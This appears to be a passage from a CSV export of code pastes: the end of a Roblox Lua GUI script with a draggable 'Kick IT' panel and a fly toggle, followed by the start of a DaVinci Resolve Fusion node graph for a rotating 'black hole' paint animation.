id,title,username,language,date,content

UICorner.CornerRadius = UDim.new(0, 33)
UICorner.Parent = Frame

KickITtext.Name = ""KickITtext""
KickITtext.Parent = Frame
KickITtext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
KickITtext.BackgroundTransparency = 1.000
KickITtext.BorderColor3 = Color3.fromRGB(0, 0, 0)
KickITtext.BorderSizePixel = 0
KickITtext.Position = UDim2.new(0.298073977, 0, 0.0231517982, 0)
KickITtext.Size = UDim2.new(0, 226, 0, 35)
KickITtext.Font = Enum.Font.SourceSans
KickITtext.Text = ""Kick IT""
KickITtext.TextColor3 = Color3.fromRGB(216, 216, 216)
KickITtext.TextSize = 30.000
KickITtext.TextWrapped = true

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.000889679708, 0, 0.113833763, 0)
Frame_2.Size = UDim2.new(0, 561, 0, 6)

UICorner_2.CornerRadius = UDim.new(1, 6)
UICorner_2.Parent = Frame_2

ScrollingFrame.Parent = Frame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 0.900
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.018340366, 0, 0.142777279, 0)
ScrollingFrame.Size = UDim2.new(0, 84, 0, 424)

UICorner_3.CornerRadius = UDim.new(0, 9)
UICorner_3.Parent = ScrollingFrame

button.Name = ""button""
button.Parent = ScrollingFrame
button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
button.BorderColor3 = Color3.fromRGB(0, 0, 0)
button.BorderSizePixel = 0
button.Position = UDim2.new(-1.81652254e-07, 0, 0.0183116626, 0)
button.Size = UDim2.new(0, 71, 0, 24)
button.Font = Enum.Font.SourceSans
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextSize = 14.000

UICorner_4.CornerRadius = UDim.new(0, 6)
UICorner_4.Parent = button

Framedestra.Name = ""Frame destra""
Framedestra.Parent = Frame
Framedestra.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Framedestra.BorderColor3 = Color3.fromRGB(0, 0, 0)
Framedestra.BorderSizePixel = 0
Framedestra.Position = UDim2.new(0.200317711, 0, 0.143007055, 0)
Framedestra.Size = UDim2.new(0, 433, 0, 423)

UICorner_5.CornerRadius = UDim.new(0, 33)
UICorner_5.Parent = Framedestra

Flybutton.Name = ""Flybutton""
Flybutton.Parent = Framedestra
Flybutton.BackgroundColor3 = Color3.fromRGB(222, 222, 222)
Flybutton.BorderColor3 = Color3.fromRGB(0, 0, 0)
Flybutton.BorderSizePixel = 0
Flybutton.Position = UDim2.new(0.267898381, 0, 0.430260032, 0)
Flybutton.Size = UDim2.new(0, 200, 0, 50)
Flybutton.Font = Enum.Font.FredokaOne
Flybutton.Text = ""Activate fly""
Flybutton.TextColor3 = Color3.fromRGB(0, 0, 0)
Flybutton.TextSize = 30.000

UICorner_6.CornerRadius = UDim.new(0, 99)
UICorner_6.Parent = Flybutton

-- Scripts:

local function RBACIRG_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	local frame = script.Parent
	local dragging = false
	local dragInput, mousePos, framePos
	
	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			mousePos = input.Position
			framePos = frame.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			dragInput = input
		end
	end)
	
	game:GetService(""UserInputService"").InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			local delta = input.Position - mousePos
			frame.Position = UDim2.new(
				framePos.X.Scale,
				framePos.X.Offset + delta.X,
				framePos.Y.Scale,
				framePos.Y.Offset + delta.Y
			)
		end
	end)
end
coroutine.wrap(RBACIRG_fake_script)()
local function HCQMM_fake_script() -- Flybutton.LocalScript 
	local script = Instance.new('LocalScript', Flybutton)

	
	local button = script.Parent
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local flying = false
	local bodyVelocity = nil
	
	local function startFlying()
		local root = character:WaitForChild(""HumanoidRootPart"")
		bodyVelocity = Instance.new(""BodyVelocity"")
		bodyVelocity.Velocity = Vector3.new(0, 50, 0)
		bodyVelocity.MaxForce = Vector3.new(100000, 100000, 100000)
		bodyVelocity.Parent = root
	end
	
	local function stopFlying()
		if bodyVelocity then
			bodyVelocity:Destroy()
			bodyVelocity = nil
		end
	end
	
	button.MouseButton1Click:Connect(function()
		flying = not flying
		if flying then
			startFlying()
			button.Text = ""Disable Fly""
		else
			stopFlying()
			button.Text = ""Activate Fly""
		end
	end)
	
end
coroutine.wrap(HCQMM_fake_script)()
local function ZOMKEP_fake_script() -- ScreenGui.LocalScript 
	local script = Instance.new('LocalScript', ScreenGui)

	local UserInputService = game:GetService(""UserInputService"")
	local gui = script.Parent
	local frame = gui:WaitForChild(""Frame"")
	
	local isVisible = false
	
	UserInputService.InputBegan:Connect(function(input, gameProcessed)
		if gameProcessed then return end
		if input.KeyCode == Enum.KeyCode.LeftControl or input.KeyCode == Enum.KeyCode.RightControl then
			isVisible = not isVisible
			frame.Visible = isVisible
		end
	end)
end
coroutine.wrap(ZOMKEP_fake_script)()
"
G7HCUZCM,Black Hole optimization v2 (11 nodes),marcusa3000,Lua,Friday 9th of May 2025 10:05:35 AM CDT,"{
	Tools = ordered() {
		MaskPaint2 = PaintMask {
			Inputs = {
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				PaintMode = Input { Value = FuID { ""None"" }, },
				MaskWidth = Input { Value = 1080, },
				MaskHeight = Input { Value = 1080, },
				PixelAspect = Input { Value = { 1, 1 }, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Paint = Input {
					SourceOp = ""PaintGroupInner"",
					Source = ""Out"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 5335, 379.5 } },
		},
		PaintGroupInner = PaintGroup {
			IsThreaded = false,
			Brushes = {
			},
			ApplyModes = {
			},
			CtrlWZoom = false,
			NameSet = true,
			Inputs = {
				Paint = Input {
					SourceOp = ""PaintGroupMid"",
					Source = ""Out"",
				},
				PaintGroup = Input {
					SourceOp = ""PolylineStroke24"",
					Source = ""Out"",
				},
				Angle = Input {
					Value = -90,
					Expression = ""-time*1.8"",
				}
			},
		},
		PaintGroupMid = PaintGroup {
			IsThreaded = true,
			Brushes = {
			},
			ApplyModes = {
			},
			CtrlWZoom = false,
			NameSet = true,
			Inputs = {
				Paint = Input {
					SourceOp = ""PaintGroupOuter"",
					Source = ""Out"",
				},
				PaintGroup = Input {
					SourceOp = ""PolylineStroke20"",
					Source = ""Out"",
				},
				Angle = Input {
					Value = -40,
					Expression = ""-time*0.8"",
				}
			},
		},
		PaintGroupOuter = PaintGroup {
			IsThreaded = true,
			Brushes = {
			},
			ApplyModes = {
			},
			CtrlWZoom = false,
			NameSet = true,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke2"",
					Source = ""Out"",
				},
				PaintGroup = Input {
					SourceOp = ""PolylineStroke16"",
					Source = ""Out"",
				},
				Angle = Input {
					Value = -42.075,
					Expression = ""-time*0.425"",
				}
			},
		},
		PolylineStroke2 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				[""CircleBrush.Size""] = Input { Value = 0.0147, },
				Polyline = Input {
					Value = Polyline {
					},
				}
			},
		},
		PolylineStroke16 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke15"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.24702856426651, Y = 0.0374481223421251, RX = 0.000504286434694902, RY = -0.0200673048802805 },
							{ Linear = true, X = 0.248541423570595, Y = -0.0227537922987164, LX = -0.000504286434694902, LY = 0.0200673048802805, RX = -0.0026797204476086, RY = -0.0149894288147033 },
							{ Linear = true, X = 0.240502262227769, Y = -0.0677220787428263, LX = 0.0026797204476086, LY = 0.0149894288147033 }
						}
					},
				}
			},
		},
		PolylineStroke15 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke14"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.0232982019932823, Y = 0.246797635334842, RX = 0.0108798648736688, RY = -0.00135375060798977 },
							{ Linear = true, X = 0.0559377966142885, Y = 0.242736383510873, LX = -0.0108798648736688, LY = 0.00135375060798977, RX = 0.0120814112413671, RY = -0.00370481550712476 },
							{ Linear = true, X = 0.0921820303383898, Y = 0.231621936989498, LX = -0.0120814112413671, LY = 0.00370481550712476 }
						}
					},
				}
			},
		},
		PolylineStroke14 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke13"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.209467833961375, Y = 0.132438739789965, RX = 0.00875687814270663, RY = 0.0120575651497472 },
							{ Linear = true, X = -0.183197199533256, Y = 0.168611435239207, LX = -0.00875687814270663, LY = -0.0120575651497472, RX = 0.0106929754092029, RY = 0.00991940363320877 },
							{ Linear = true, X = -0.151118273305647, Y = 0.198369646138833, LX = -0.0106929754092029, LY = -0.00991940363320877 }
						}
					},
				}
			},
		},
		PolylineStroke13 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke12"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.113805202555479, Y = -0.22136802386398, RX = -0.0122105400407429, RY = 0.00712673480382311 },
							{ Linear = true, X = -0.150436822677708, Y = -0.199987819452511, LX = 0.0122105400407429, LY = -0.00712673480382311, RX = -0.00989007497215243, RY = 0.00855698171917542 },
							{ Linear = true, X = -0.180107047594165, Y = -0.174316874294985, LX = 0.00989007497215243, LY = -0.00855698171917542 }
						}
					},
				}
			},
		},
		PolylineStroke12 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke11"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.304550758459743, Y = -0.116880228873688, RX = -0.00933488914819136, RY = -0.0223001337437764 },
							{ Linear = true, X = 0.276546091015169, Y = -0.183780630105017, LX = 0.00933488914819136, LY = 0.0223001337437764, RX = -0.0152163699450459, RY = -0.0158803511623041 },
							{ Linear = true, X = 0.230896981180032, Y = -0.23142168359193, LX = 0.0152163699450459, LY = 0.0158803511623041 }
						}
					},
				}
			},
		},
		PolylineStroke11 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke10"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.319027957004433, Y = 0.070216884357176, RX = 0.00295334144192968, RY = -0.0150431232571372 },
							{ Linear = true, X = 0.327887981330222, Y = 0.0250875145857643, LX = -0.00295334144192968, LY = 0.0150431232571372, RX = -0.00113315527647528, RY = -0.0124308756127338 },
							{ Linear = true, X = 0.324488515500796, Y = -0.0122051122524372, LX = 0.00113315527647528, LY = 0.0124308756127338 }
						}
					},
				}
			},
		},
		PolylineStroke10 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke9"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.240386402524993, Y = 0.219373146722263, RX = 0.00972167503618845, RY = -0.0112926646797966 },
							{ Linear = true, X = 0.269551427633558, Y = 0.185495152682874, LX = -0.00972167503618845, LY = 0.0112926646797966, RX = 0.00661004532012466, RY = -0.0121457582500355 },
							{ Linear = true, X = 0.289381563593932, Y = 0.149057877932767, LX = -0.00661004532012466, LY = 0.0121457582500355 }
						}
					},
				}
			},
		},
		PolylineStroke9 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke8"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.0740599134763391, Y = 0.316229125114281, RX = 0.0177093170559228, RY = -0.00680994174365585 },
							{ Linear = true, X = 0.127187864644107, Y = 0.295799299883314, LX = -0.0177093170559228, LY = 0.00680994174365585, RX = 0.0159514379478487, RY = -0.00759218482569361 },
							{ Linear = true, X = 0.175042178487653, Y = 0.273022745406233, LX = -0.0159514379478487, LY = 0.00759218482569361 }
						}
					},
				}
			},
		},
		PolylineStroke8 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke7"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.323833232985785, Y = 0.0297354487212619, RX = 0.0023315544605369, RY = 0.015923256203207 },
							{ Linear = true, X = -0.316838569604174, Y = 0.077505217330883, LX = -0.0023315544605369, LY = -0.015923256203207, RX = 0.00584297702366321, RY = 0.0171443130095034 },
							{ Linear = true, X = -0.299309638533185, Y = 0.128938156359393, LX = -0.00584297702366321, LY = -0.0171443130095034 }
						}
					},
				}
			},
		},
		PolylineStroke7 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke6"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.138446044587865, Y = -0.294157573917388, RX = -0.0234140258992023, RY = 0.0143431193757535 },
							{ Linear = true, X = -0.208688122285472, Y = -0.251128215790128, LX = 0.0234140258992023, LY = -0.0143431193757535, RX = -0.0171607668107646, RY = 0.0166182826336514 },
							{ Linear = true, X = -0.260170422717766, Y = -0.201273367889173, LX = 0.0171607668107646, LY = -0.0166182826336514, RX = -0.00864256298143814, RY = 0.0143878943138941 },
							{ Linear = true, X = -0.28609811166208, Y = -0.158109684947491, LX = 0.00864256298143814, LY = -0.0143878943138941 }
						}
					},
				}
			},
		},
		PolylineStroke6 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke5"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.149358226371062, Y = -0.289971497645227, RX = -0.020109499116146, RY = -0.00859982114538849 },
							{ Linear = true, X = 0.0890297290226238, Y = -0.315770961081392, LX = 0.020109499116146, LY = 0.00859982114538849, RX = -0.0224513032027859, RY = -0.00325971757555373 },
							{ Linear = true, X = 0.0216758194142661, Y = -0.325550113808054, LX = 0.0224513032027859, LY = 0.00325971757555373 }
						}
					},
				}
			},
		},
		PolylineStroke5 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke4"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.411023855032417, Y = 0.0318922160737311, RX = -0.000485197885173483, RY = -0.0271612715578326 },
							{ Linear = true, X = 0.409568261376896, Y = -0.0495915985997666, LX = 0.000485197885173483, LY = 0.0271612715578326, RX = -0.00479842148954692, RY = -0.021654408128841 },
							{ Linear = true, X = 0.395172996908255, Y = -0.11455482298629, LX = 0.00479842148954692, LY = 0.021654408128841 }
						}
					},
				}
			},
		},
		PolylineStroke4 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke3"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.352402777948181, Y = 0.213169627987373, RX = 0.0126569928074114, RY = 0.0168761971990655 },
							{ Linear = true, X = -0.314431799525947, Y = 0.26379821958457, LX = -0.0126569928074114, LY = -0.0168761971990655, RX = 0.0160809555219423, RY = 0.0168708211251655 },
							{ Linear = true, X = -0.26618893296012, Y = 0.314410682960066, LX = -0.0160809555219423, LY = -0.0168708211251655 }
						}
					},
				}
			},
		},
		PolylineStroke3 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.148678414096916, Y = -0.383324160704458, RX = 0.0150513950073421, RY = -0.00476976701522656 },
							{ Linear = true, X = -0.10352422907489, Y = -0.397633461750138, LX = -0.0150513950073421, LY = 0.00476976701522656, RX = 0.0139500734214391, RY = -0.00293524124013942 },
							{ Linear = true, X = -0.0616740088105727, Y = -0.406439185470556, LX = -0.0139500734214391, LY = 0.00293524124013942 }
						}
					},
				}
			},
		},
		PolylineStroke20 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke19"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				[""CircleBrush.Size""] = Input { Value = 0.0125, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.0912068965517241, Y = -0.0605172413793104, RX = -0.00609195402298849, RY = -0.00735632183908045 },
							{ Linear = true, X = 0.0729310344827586, Y = -0.0825862068965517, LX = 0.00609195402298849, LY = 0.00735632183908045, RX = -0.00944906856916368, RY = -0.00557273087594134 },
							{ Linear = true, X = 0.0445838287752676, Y = -0.0993043995243757, LX = 0.00944906856916368, LY = 0.00557273087594134, RX = -0.0104359889021007, RY = -0.00270313119302417 },
							{ Linear = true, X = 0.0132758620689655, Y = -0.107413793103448, LX = 0.0104359889021007, LY = 0.00270313119302417, RX = -0.0114942528735632, RY = 0.000114942528735622 },
							{ Linear = true, X = -0.0212068965517241, Y = -0.107068965517241, LX = 0.0114942528735632, LY = -0.000114942528735622 }
						}
					},
				}
			},
		},
		PolylineStroke19 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke18"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				[""CircleBrush.Size""] = Input { Value = 0.0125, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.0607299383660954, Y = 0.0901775524331088, RX = 0.00926143276532942, RY = -0.00892853338758316 },
							{ Linear = true, X = 0.0885142366620837, Y = 0.0633919522703593, LX = -0.00926143276532942, LY = 0.00892853338758316, RX = 0.00379183271032179, RY = -0.00721677168689612 },
							{ Linear = true, X = 0.0998897347930491, Y = 0.041741637209671, LX = -0.00379183271032179, LY = 0.00721677168689612, RX = 0.00216708363812143, RY = -0.0071942310374513 },
							{ Linear = true, X = 0.106390985707413, Y = 0.0201589440973171, LX = -0.00216708363812143, LY = 0.0071942310374513 }
						}
					},
				}
			},
		},
		PolylineStroke18 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke17"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				[""CircleBrush.Size""] = Input { Value = 0.0125, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.105344827586207, Y = 0.0232758620689655, RX = 0.00137931034482758, RY = 0.00517241379310348 },
							{ Linear = true, X = -0.101206896551724, Y = 0.0387931034482759, LX = -0.00137931034482758, LY = -0.00517241379310348, RX = 0.00218390804597701, RY = 0.00551724137931031 },
							{ Linear = true, X = -0.0946551724137931, Y = 0.0553448275862068, LX = -0.00218390804597701, LY = -0.00551724137931031 }
						}
					},
				}
			},
		},
		PolylineStroke17 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				[""CircleBrush.Size""] = Input { Value = 0.0125, },
				Polyline = Input {
					Value = Polyline {
						Closed = true,
						Points = {
							{ Linear = true, X = -0.067029843675983, Y = -0.0856432125088841, LX = -0.00479368859283589, LY = 0.00388608224429119, RX = -0.00479368859283589, RY = 0.00388608224429119 },
							{ Linear = true, X = -0.0814109094544906, Y = -0.0739849657760105, LX = 0.00479368859283589, LY = -0.00388608224429119, RX = 0.00479368859283589, RY = -0.00388608224429119 }
						}
					},
				}
			},
		},
		PolylineStroke24 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke23"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.0726989773232548, Y = -0.0569141840818141, RX = -0.00489106269453092, RY = -0.00448848620499789 },
							{ Linear = true, X = 0.0580257892396621, Y = -0.0703796426968078, LX = 0.00489106269453092, LY = 0.00448848620499789, RX = -0.0062249888839484, RY = -0.00380049032348606 },
							{ Linear = true, X = 0.0393508225878169, Y = -0.081781113667266, LX = 0.0062249888839484, LY = 0.00380049032348606 }
						}
					},
				},
				[""CircleBrush.Size""] = Input { Value = 0.0125, }
			},
		},
		PolylineStroke23 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke22"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.0211204979991107, Y = 0.0884837705646955, RX = 0.00696433557033099, RY = 0.000445503772563841 },
							{ Linear = true, X = -0.00022749128811772, Y = 0.089820281882387, LX = -0.00696433557033099, LY = -0.000445503772563841, RX = 0.00799580175168291, RY = -0.000737623267533201 },
							{ Linear = true, X = 0.023759913966931, Y = 0.0876074120797874, LX = -0.00799580175168291, LY = 0.000737623267533201, RX = 0.00651988707959883, RY = -0.00233366731025953 },
							{ Linear = true, X = 0.0433195752057275, Y = 0.0806064101490088, LX = -0.00651988707959883, LY = 0.00233366731025953 }
						}
					},
				},
				[""CircleBrush.Size""] = Input { Value = 0.0125, }
			},
		},
		PolylineStroke22 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke21"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.0905778306192983, Y = 0.00666963094708761, RX = 0.000327484965584994, RY = 0.0062249888839484 },
